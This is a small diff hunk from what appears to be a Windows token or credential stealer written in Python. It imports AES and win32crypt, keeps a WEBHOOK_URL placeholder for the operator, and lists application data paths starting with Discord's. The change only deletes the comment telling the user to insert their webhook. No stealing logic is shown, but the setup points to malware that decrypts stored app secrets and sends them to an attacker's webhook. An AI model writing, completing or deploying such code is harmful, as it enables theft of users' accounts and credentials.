@@ -3,7 +3,7 @@ from pathlib import Path
 from Crypto.Cipher import AES
 import win32crypt
 
-WEBHOOK_URL = "YOUR_WEBHOOK_HERE"  # Replace this with your webhook
+WEBHOOK_URL = "YOUR_WEBHOOK_HERE" 
 
 APP_PATHS = {
     'Discord': r"%APPDATA%\discord",
